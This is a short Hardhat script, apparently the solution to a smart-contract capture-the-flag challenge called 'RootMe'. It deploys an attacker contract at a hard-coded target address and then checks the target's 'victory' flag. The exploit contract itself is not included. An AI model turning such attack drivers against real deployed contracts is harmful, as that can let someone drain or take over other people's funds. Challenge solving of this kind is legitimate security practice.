import { ethers } from "hardhat";

const contractAddress = "0xf35776AbB798cd200F27fD3b9abD52A2B118a635";

async function main() {
  const attackerContract = await (await ethers.getContractFactory("ChallengeRootMeAttacker")).deploy(contractAddress);
  await attackerContract.deployed();

  const contract = (await ethers.getContractFactory("RootMe")).attach(contractAddress);
  console.log("victory", await contract.victory());
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
